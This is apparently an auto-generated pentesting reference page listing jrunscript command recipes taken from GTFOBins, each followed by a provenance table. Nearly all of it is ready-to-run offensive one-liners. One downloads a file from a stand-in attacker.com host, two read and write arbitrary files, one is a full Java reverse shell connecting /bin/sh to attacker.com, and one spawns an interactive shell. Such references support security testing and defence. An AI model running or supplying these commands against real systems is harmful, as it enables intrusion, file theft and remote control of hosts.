---
parsed_by: focuslocust
source: commands
type: generated
---
# jrunscript Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## jrunscript

Tool page: [jrunscript](../../tools/linux/jrunscript.md)

### download

```text
jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/path/to/input-file"));
    while ((line = br.readLine()) != null) { print(line); }'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
jrunscript -e 'var fw=new java.io.FileWriter("/path/to/output-file");
    fw.write("DATA");
    fw.close();'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
jrunscript -e 'var host="attacker.com";
    var port=12345;
    var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript` |
| Evidence | Function example preserved from source parser. |

### shell

```text
jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jrunscript` |
| Evidence | Function example preserved from source parser. |
